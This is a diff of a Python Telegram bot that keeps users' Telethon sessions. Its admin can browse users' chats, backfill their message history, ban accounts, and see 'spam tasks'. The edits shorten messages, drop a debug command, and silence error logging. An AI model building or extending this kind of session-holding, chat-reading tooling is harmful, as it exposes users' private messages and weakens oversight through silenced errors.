+            f"👤 ID: <code>{u}</code>\nИмя: {get_user_mention(u)}\nКлиент: {online}\nTelethon: {sstat}\n"
+            f"Чатов: <code>{cc}</code>\nСообщений: <code>{mc}</code>",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
         except: pass
         await callback.answer(); return
 
     if data.startswith("restart_client_"):
         u = int(data.split("_")[2])
         sess = get_session(u)
-        if not sess: await callback.answer("❌ Нет сессии", show_alert=True); return
+        if not sess: await callback.answer("❌", show_alert=True); return
         await callback.answer("⏳", show_alert=False)
         if u in telethon_clients:
             try: await telethon_clients[u].disconnect()
             except: pass
             del telethon_clients[u]
         c = await start_telethon_listener(u, sess)
-        if c: await callback.message.answer("✅ Клиент запущен!")
-        else: await callback.message.answer("❌ Не удалось.")
+        await callback.message.answer("✅" if c else "❌")
         return
 
     if data.startswith("fullbf_"):
@@ -2153,19 +1983,19 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
         if not c:
             sess = get_session(u)
             if sess: c = await start_telethon_listener(u, sess)
-        if not c: await callback.answer("❌ Нет сессии", show_alert=True); return
+        if not c: await callback.answer("❌", show_alert=True); return
         await callback.answer("⏳", show_alert=False)
         msg = callback.message
         async def _run():
             try:
                 await backfill_dialogs(c, u, max_dialogs=300, per_chat=50)
-                await msg.answer("✅ Готово.")
-            except Exception as e: await msg.answer(f"❌ {e}")
+                await msg.answer("✅")
+            except: pass
         asyncio.create_task(_run()); return
 
     if data.startswith("delete_user_"):
         u = int(data.split("_")[2]); delete_business_account(u)
-        await callback.answer("✅ Удалён!", show_alert=True)
+        await callback.answer("✅", show_alert=True)
         try: await callback.message.edit_text("👥", reply_markup=get_users_keyboard(0), parse_mode="HTML")
         except: pass
         return
@@ -2175,19 +2005,19 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
         if u in banned_users: set_user_ban(u, False); await callback.answer("✅ Разбанен!", show_alert=True)
         else: set_user_ban(u, True); await callback.answer("🚫 Забанен!", show_alert=True)
         cc = count_user_chats(u)
-        try:
-            await callback.message.edit_text(
-                f"👤 ID: <code>{u}</code>\nЗабанен: {u in banned_users}\nЧатов: {cc}",
-                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                    [InlineKeyboardButton(text=f"📋 Чаты ({cc})", callback_data=f"live_chats_{u}_0")],
-                    [InlineKeyboardButton(text="🚫 Забанить/Разбанить", callback_data=f"ban_user_{u}")],
-                    [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]]),
-                parse_mode="HTML")
+        try: await callback.message.edit_text(
+            f"👤 ID: <code>{u}</code>\nЗабанен: {u in banned_users}\nЧатов: {cc}",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text=f"📋 Чаты ({cc})", callback_data=f"live_chats_{u}_0")],
+                [InlineKeyboardButton(text="🚫 Бан/Разбан", callback_data=f"ban_user_{u}")],
+                [InlineKeyboardButton(text="🔙", callback_data="admin_users")]]),
+            parse_mode="HTML")
         except: pass
         return
 
     if data == "admin_ban_prompt":
-        try: await callback.message.edit_text("🚫 /ban 123456789\n/unban 123456789", reply_markup=get_admin_keyboard(), parse_mode="HTML")
+        try: await callback.message.edit_text("🚫 /ban 123456789\n/unban 123456789",
+                                              reply_markup=get_admin_keyboard(), parse_mode="HTML")
         except: pass
         await callback.answer(); return
 
@@ -2205,9 +2035,8 @@ async def cmd_ban(message: Message):
     try:
         a = message.text.split(maxsplit=1)[1]
         t = await resolve_user_id(a)
-        if t: set_user_ban(t, True); delete_business_account(t); await message.answer(f"🚫 Забанен!")
-        else: await message.answer("❌")
-    except: await message.answer("Формат: /ban 123456789")
+        if t: set_user_ban(t, True); delete_business_account(t); await message.answer("🚫")
+    except: pass
 
 @dp.message(Command("unban"))
 async def cmd_unban(message: Message):
@@ -2215,9 +2044,8 @@ async def cmd_unban(message: Message):
     try:
         a = message.text.split(maxsplit=1)[1]
         t = await resolve_user_id(a)
-        if t: set_user_ban(t, False); await message.answer(f"✅ Разбанен!")
-        else: await message.answer("❌")
-    except: await message.answer("Формат: /unban 123456789")
+        if t: set_user_ban(t, False); await message.answer("✅")
+    except: pass
 
 @dp.message(Command("restore"))
 async def cmd_restore(message: Message):
@@ -2225,20 +2053,6 @@ async def cmd_restore(message: Message):
     await message.answer("⏳...")
     await restore_all_sessions()
     await message.answer(f"✅ Клиентов: <b>{len(telethon_clients)}</b>", parse_mode="HTML")
-
-@dp.message(Command("debug_user"))
-async def cmd_debug_user(message: Message):
-    if message.from_user.id != ADMIN_ID: return
-    try:
-        a = message.text.split(maxsplit=1)[1]
-        t = await resolve_user_id(a)
-        if not t: await message.answer("❌"); return
-        sess = get_session(t); c = telethon_clients.get(t)
-        tasks = [x for x in active_spam_tasks if x[0] == t or x[1] == t]
-        await message.answer(f"🔎 <b>User {t}</b>\nСессия: {'✅' if sess else '❌'}\nКлиент: {'✅' if c else '❌'}\n"
-                             f"Чатов: {count_user_chats(t)}\nСообщений: {count_user_messages(t)}\nСпам-тасков: {len(tasks)}",
-                             parse_mode="HTML")
-    except: await message.answer("Формат: /debug_user 123")
 
 @dp.update()
 async def global_update_handler(update: Update, bot: Bot):
@@ -2254,7 +2068,7 @@ async def global_update_handler(update: Update, bot: Bot):
                     bt = bc_id or cached.get("bc_id")
                     if bt: kw["business_connection_id"] = bt
                     await bot.send_message(**kw); msg_cache.pop((ccid, cmid), None)
-    except Exception as e: logging.error(f"deleted: {e}")
+    except: pass
 
 @dp.message()
 @dp.business_message()
@@ -2289,7 +2103,6 @@ async def handle(message: Message):
                                       message.from_user.username or "", message.text, message.message_id)
 
         if uid in banned_users or (owner_id and owner_id in banned_users): return
-
         if bot_id is None:
             me = await bot.get_me(); bot_id = me.id; bot_user_id = me.id
         if bc_id: active_chats.setdefault(bc_id, set()).add(chat_id)
@@ -2304,24 +2117,16 @@ async def handle(message: Message):
         is_group = message.chat.type in ("group", "supergroup", "channel")
 
         if is_group:
-            # группы — если есть Telethon, обрабатывает он. Иначе aiogram.
             hnd = owner_id if owner_id else uid
-            if hnd in telethon_clients:
-                return
+            if hnd in telethon_clients: return
             if bc_id:
-                is_from_me = True
-                co = owner_id or uid
-            else:
-                return
+                is_from_me = True; co = owner_id or uid
+            else: return
         else:
             if bc_id:
-                # ============ ГЛАВНЫЙ ФИКС: разрешаем И владельцу, И собеседнику ============
-                is_from_me = True
-                co = owner_id or uid
+                is_from_me = True; co = owner_id or uid
             else:
-                is_from_me = True
-                co = uid
-                in_private_bot = True
+                is_from_me = True; co = uid; in_private_bot = True
 
         if uid in mutes and datetime.now() < mutes[uid]["until"]:
             await delete_msg(chat_id, message.message_id, bc_id); return
@@ -2329,13 +2134,11 @@ async def handle(message: Message):
         if chat_id in reply_guard_chats and message.reply_to_message:
             await delete_msg(chat_id, message.message_id, bc_id); return
 
-        # Подписка: только для владельца в ЛС с ботом, НЕ для собеседника в бизнес-чате
         if in_private_bot and uid != ADMIN_ID:
             text_raw = message.text or ""
             if not text_raw.startswith("/start"):
                 if not await check_subscription(uid):
-                    await require_subscription(message)
-                    return
+                    await require_subscription(message); return
 
         text_raw = message.text
         if not text_raw: return
@@ -2366,16 +2169,13 @@ async def handle(message: Message):
                 kw = {"chat_id": chat_id, "text": txt, "parse_mode": "HTML"}
                 if bc_id: kw["business_connection_id"] = bc_id
                 await bot.send_message(**kw)
-            except Exception as e:
-                logging.warning(f"send_reply_aiogram: {e}")
+            except: pass
 
-        handled = await process_command_text(
-            text_raw, co, chat_id, bc_id=bc_id,
-            aiogram_message=message, in_private_bot=in_private_bot,
-            send_reply=send_reply_aiogram)
+        handled = await process_command_text(text_raw, co, chat_id, bc_id=bc_id,
+                                             aiogram_message=message, in_private_bot=in_private_bot,
+                                             send_reply=send_reply_aiogram)
         if handled:
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            return
+            await clear_cmd(chat_id, message.message_id, bc_id); return
 
         ft, modified = apply_modifications(text_raw, chat_id, message.entities)
         if modified:
@@ -2398,7 +2198,6 @@ async def main():
     try: await bot.delete_webhook(drop_pending_updates=True)
     except: pass
     me = await bot.get_me(); bot_user_id = me.id
-    logging.info(f"🤖 bot_user_id = {bot_user_id}")
     await restore_all_sessions()
     asyncio.create_task(global_typing_loop())
     asyncio.create_task(child_decay_loop())
